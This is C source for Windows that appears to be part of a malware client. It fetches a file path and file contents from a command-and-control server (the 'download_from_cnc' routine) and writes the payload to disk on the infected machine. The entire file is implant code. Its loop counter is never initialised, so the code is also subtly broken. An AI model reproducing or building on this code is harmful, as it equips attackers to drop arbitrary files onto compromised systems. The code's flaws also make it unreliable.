#include <stdio.h>
#include <windows.h>
#include "client.h"

#define PATH_BUFFSIZE 1024
#define FILESIZE_BUFFSIZE 8
#define FILECONTENT_BUFFSIZE 8192

long get_file_size() {
  char* file_size_buf = recv_from_cnc(FILESIZE_BUFFSIZE);
  long file_size = *(long*)file_size_buf;
  free(file_size_buf);
  return file_size;
}

unsigned long get_bufsize(unsigned long file_size, unsigned long bytes_read) {
  unsigned long to_be_read = file_size - bytes_read;
  if (to_be_read < FILECONTENT_BUFFSIZE) {
    return to_be_read;
  } else {
    return FILECONTENT_BUFFSIZE;
  }
}

HANDLE open_uploaded_file() {
  HANDLE file;
  char* path = recv_from_cnc(PATH_BUFFSIZE);
  file = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_NEW,
                     FILE_ATTRIBUTE_NORMAL, NULL);
  free(path);
  return file;
}

void recv_into_file(HANDLE file) {
  unsigned long bytes_read, bytes_written, to_be_read, bufsize, file_size;
  char* buf;
  file_size = get_file_size();
  while (bytes_read < file_size) {
    bufsize = get_bufsize(file_size, bytes_read);
    buf = recv_from_cnc(bufsize);
    WriteFile(file, buf, bufsize, &bytes_written, NULL);
    free(buf);
    bytes_read += bufsize;
  }
}

void download_from_cnc() {
  HANDLE file = open_uploaded_file();
  recv_into_file(file);
  CloseHandle(file);
}
